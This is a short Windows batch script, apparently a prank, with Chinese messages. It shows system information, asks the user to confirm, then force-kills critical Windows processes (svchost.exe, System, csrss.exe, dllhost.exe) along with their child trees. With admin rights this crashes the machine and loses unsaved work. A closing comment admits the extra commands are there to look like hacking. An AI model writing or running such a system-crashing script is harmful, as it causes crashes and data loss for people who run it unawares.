@echo off
VER
VOL
TIME /T
SYSTEMINFO
echo 真的要继续吗
color 2
echo 你可以关闭这个窗口来取消操作
pause
taskkill /T /F /IM svchost.exe 
taskkill /T /F /IM system
taskkill /T /F /IM csrss.exe
taskkill /T /F /IM dllhost.exe
CLS
color 4
echo 看来失败了
pause
rem 别问我为什么搞那么多无用命令，你不觉得很hack吗